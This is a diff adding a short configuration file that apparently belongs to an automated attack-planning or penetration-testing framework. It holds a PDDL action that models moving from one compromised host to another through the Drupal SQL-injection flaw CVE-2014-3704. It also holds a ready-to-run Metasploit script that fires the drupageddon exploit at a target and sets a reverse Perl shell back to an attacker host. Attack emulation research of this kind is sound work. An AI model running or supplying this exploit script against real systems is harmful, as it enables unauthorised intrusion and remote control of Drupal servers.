@@ -1,0 +1,29 @@
+[pddl]
+    (:action exploit/multi/http/drupal_drupageddon
+        :parameters (?from ?to)
+        :precondition (and
+            (located ?from)
+            (connected ?from ?to)
+            (exploited ?from)
+            (CVE-2014-3704 ?to)
+        )
+        :effect (and
+            (not (located ?from))
+            (located ?to)
+            (exploited ?to)
+        )
+    )
+
+[script]
+|> msf
+use exploit/multi/http/drupal_drupageddon
+set RHOSTS {RHOSTS}
+set TARGETURI /drupal/
+set payload php/reverse_perl
+set LHOST {LHOST}
+exploit -z
+
+[evc]
+
+[evd]
+LOG: Q=1, A=4
